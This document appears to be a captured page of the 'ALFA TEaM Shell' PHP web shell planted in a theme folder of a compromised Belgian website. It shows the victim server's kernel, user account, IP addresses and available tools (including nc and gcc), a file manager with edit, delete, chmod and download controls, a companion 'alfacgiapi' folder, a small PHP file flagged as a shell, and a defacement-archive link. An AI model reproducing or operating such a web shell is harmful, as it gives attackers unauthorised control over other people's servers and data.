...
<title>..:: saniworld.be ~ ALFA TEaM Shell - v3.0.2 ::..</title>
...
var c_ = '/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/';
var a_ = 'FilesMan'
var charset_ = '';
var alfa1_ = '';
var alfa2_ = '';
...
function alfab64(a, normal){
	...
	return encrypt(a, "205642964468894cf3948257.17328902");
}
...
<input type="hidden" name="c" value="/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/"><input type="hidden" name="alfa1"><input type="hidden" name="alfa2"><input type="hidden" name="alfa3"><input type="hidden" name="alfa4"><input type="hidden" name="alfa5"><input type="hidden" name="alfa6"><input type="hidden" name="alfa7"><input type="hidden" name="alfa8"><input type="hidden" name="alfa9"><input type="hidden" name="alfa10"><input type="hidden" name="charset">
</form>
...
<td colspan="2"><span class="header_values" id="header_uname">Linux plesk.justlikeu.be 4.15.0-197-generic #208-Ubuntu SMP Tue Nov 1 17:23:37 UTC 2022 x86_64</span></td>
</tr>
<tr>
<td><span class="header_vars">User:</span></td>
<td><span class="header_values" id="header_userid">10040 [ saniworld_3k4ime4ls2y ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">1003 [ psacln ]</span> </td>
...
<td><b>51.68.39.139 <span class="header_vars">Your IP:</span><b> 68.183.224.18</b></td>
</tr>
<tr>
<td width="3%"><span class="header_vars">DateTime:</span></td>
<td colspan="2"><b>2025-07-30 02:18:57</b></td>
</tr>
<tr>
...
<td><span class="header_vars">Total:</span><b>395.19 GB </b><span class="header_vars">Free:</span><b>18.22 GB [4%]</b></td>
</tr><tr><td height="18" colspan="2"><span class="header_vars">Useful : </span><span class="header_values" style="margin-left: 4px;">gcc</span><span class="header_values" style="margin-left: 4px;">cc</span><span class="header_values" style="margin-left: 4px;">ld</span><span class="header_values" style="margin-left: 4px;">php</span><span class="header_values" style="margin-left: 4px;">perl</span><span class="header_values" style="margin-left: 4px;">python</span><span class="header_values" style="margin-left: 4px;">ruby</span><span class="header_values" style="margin-left: 4px;">tar</span><span class="header_values" style="margin-left: 4px;">gzip</span><span class="header_values" style="margin-left: 4px;">nc</span><span class="header_values" style="margin-left: 4px;">locate</span></td>
</tr>
<tr>
...
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b><span class="disable_functions">opcache_get_status</span></b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span><span class='header_on'> ON </span> | <span class="header_vars">SSH2 : </span><span class='header_off'> OFF </span> | <span class="header_vars">Magic Quotes : </span><span class="header_off">OFF</span> | <span class="header_vars"> MySQL :</span><span class='header_off'> OFF </span> | <span class="header_vars">MSSQL :</span><span class='header_off'> OFF </span> | <span class="header_vars"> PostgreSQL :</span><span class='header_on'> ON </span> | <span class="header_vars"> Oracle :</span><span class='header_off'> OFF </span> | <span class="header_vars"> CGI :</span> <span class='header_off' id='header_cgishell'>OFF</span></td><td width="15%"><center><a href="http://zone-h.org/archive/notifier=ALFA%20TEaM%202012" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></td>
</tr>
<tr>
<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>/var/www/vhosts/saniworld.be/:/tmp/</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b><span class='header_none'> NONE </span></b> | <span class="header_vars"> Safe_mode_include_dir :</span></b><span class='header_none'> NONE </span></b></td>
</tr>
<tr>
...
<td colspan="2"><span id="header_cwd"><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/")'>/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/var/")'>var/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/var/www/")'>www/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/var/www/vhosts/")'>vhosts/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/var/www/vhosts/saniworld.be/")'>saniworld.be/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/var/www/vhosts/saniworld.be/httpdocs/")'>httpdocs/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/var/www/vhosts/saniworld.be/httpdocs/themes/")'>themes/</a><a class='header_pwd' href='javascript:void(0);' onclick='g("FilesMan","/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/")'>zMousse/</a> </span><a href="javascript:void(0);" onclick="g('FilesMan','/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse','','','')"><span class="home_shell">[ Home Shell ]</span> </a><a href="javascript:void(0);" onclick="path_history('back');"><span class="back_shell">[ BACK ]</span></a></td>
</tr>
</table>
</div>
<div id="meunlist">
...
</ul></div><script>alfa1_=alfa2_=alfa3_=""</script><div class="ajaxarea"><div class="header"><form onsubmit='fc(this);return false;' name='files' method='post'><table width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk' onclick='checkBox();' class='chkbx'><label for='mchk'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value=".." class="chkbx" id="checkbox0"><label for="checkbox0"></label></div></td><td><img src="http://solevisible.com/icons/back.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/..');" title=><b>| .. |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-29 12:07:23</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('..','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('..', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('..', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # .. # ?'); chk ? g('FilesMan',null,'delete', '..') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="_dev" class="chkbx" id="checkbox1"><label for="checkbox1"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/_dev');" title=><b>| _dev |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('_dev','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('_dev', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('_dev', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # _dev # ?'); chk ? g('FilesMan',null,'delete', '_dev') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="alfacgiapi" class="chkbx" id="checkbox2"><label for="checkbox2"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/alfacgiapi');" title=><b>| alfacgiapi |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-28 15:46:08</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('alfacgiapi','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('alfacgiapi', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('alfacgiapi', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # alfacgiapi # ?'); chk ? g('FilesMan',null,'delete', 'alfacgiapi') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="assets" class="chkbx" id="checkbox3"><label for="checkbox3"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/assets');" title=><b>| assets |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('assets','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('assets', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('assets', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # assets # ?'); chk ? g('FilesMan',null,'delete', 'assets') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="config" class="chkbx" id="checkbox4"><label for="checkbox4"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/config');" title=><b>| config |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('config','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('config', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('config', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # config # ?'); chk ? g('FilesMan',null,'delete', 'config') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="modules" class="chkbx" id="checkbox5"><label for="checkbox5"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/modules');" title=><b>| modules |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('modules','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('modules', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('modules', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # modules # ?'); chk ? g('FilesMan',null,'delete', 'modules') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="templates" class="chkbx" id="checkbox6"><label for="checkbox6"></label></div></td><td><img src="http://solevisible.com/icons/folder.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="g('FilesMan','/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/templates');" title=><b>| templates |</b></a></td></div><td><span style="font-weight:unset;" class="main_size">dir</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('templates','chmod','','','','dir')"><span style="font-weight:unset;" class="main_green_perm">0755</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">drwxr-xr-x</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('templates', 'rename','','','','dir')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('templates', 'touch','','','','dir')">T</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # templates # ?'); chk ? g('FilesMan',null,'delete', 'templates') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="install-tutorial.html.url" class="chkbx" id="checkbox7"><label for="checkbox7"></label></div></td><td><img src="http://solevisible.com/icons/notfound.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('install-tutorial.html.url','auto','','','','file');">install-tutorial.html.url</a></td></div><td><span style="font-weight:unset;" class="main_size">177 B</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('install-tutorial.html.url','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('install-tutorial.html.url', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('install-tutorial.html.url', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('install-tutorial.html.url', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'install-tutorial.html.url', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # install-tutorial.html.url # ?'); chk ? g('FilesMan',null,'delete', 'install-tutorial.html.url') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="License.url" class="chkbx" id="checkbox8"><label for="checkbox8"></label></div></td><td><img src="http://solevisible.com/icons/notfound.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('License.url','auto','','','','file');">License.url</a></td></div><td><span style="font-weight:unset;" class="main_size">133 B</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('License.url','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('License.url', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('License.url', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('License.url', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'License.url', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # License.url # ?'); chk ? g('FilesMan',null,'delete', 'License.url') : '';"> X </a></td></tr><tr class=l1><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="otuz1.php" class="chkbx" id="checkbox9"><label for="checkbox9"></label></div></td><td><img src="http://solevisible.com/icons/php.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('otuz1.php','auto','','','','file');"><span class='shell_name' style='font-weight:unset;'>otuz1.php</span></a></td></div><td><span style="font-weight:unset;" class="main_size">345 B</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('otuz1.php','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('otuz1.php', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('otuz1.php', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('otuz1.php', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'otuz1.php', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # otuz1.php # ?'); chk ? g('FilesMan',null,'delete', 'otuz1.php') : '';"> X </a></td></tr><tr><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="preview.png" class="chkbx" id="checkbox10"><label for="checkbox10"></label></div></td><td><img src="http://solevisible.com/icons/png.png" width="30" height="30"><div style="position:relative;display:inline-block;bottom:12px;"><a class="main_name" href=javascript:void(0) onclick="editor('preview.png','auto','','','','file');">preview.png</a></td></div><td><span style="font-weight:unset;" class="main_size">2.27 MB</span></td><td><span style="font-weight:unset;" class="main_modify">2025-07-27 18:35:24</span></td><td><span style="font-weight:unset;" class="main_owner_group">saniworld_3k4ime4ls2y/psacln</span></td><td><a href=javascript:void(0) onclick="editor('preview.png','chmod','','','','file')"><span style="font-weight:unset;" class="main_green_perm">0644</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="main_green_perm">-rw-r--r--</span></td><td><a class="actions" href="javascript:void(0);" onclick="editor('preview.png', 'rename','','','','file')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor('preview.png', 'touch','','','','file')">T</a> <a class="actions" href="javascript:void(0);" onclick="editor('preview.png', 'edit','','','','file')">E</a> <a class="actions" href="javascript:void(0);" onclick="g('FilesTools',null,'preview.png', 'download')">D</a><a class="actions" href="javascript:void(0);" onclick="var chk = confirm('Are You Sure For Delete # preview.png # ?'); chk ? g('FilesMan',null,'delete', 'preview.png') : '';"> X </a></td></tr><tr><td colspan=7>
<input type=hidden name=a value='FilesMan'>
<input type=hidden name=c value='/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/'>
...
<tr>
<td colspan='2'><form onsubmit='g("FilesMan",this.c.value,"");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='/var/www/vhosts/saniworld.be/httpdocs/themes/zMousse/'> <input type='submit' value=' '></form></td>
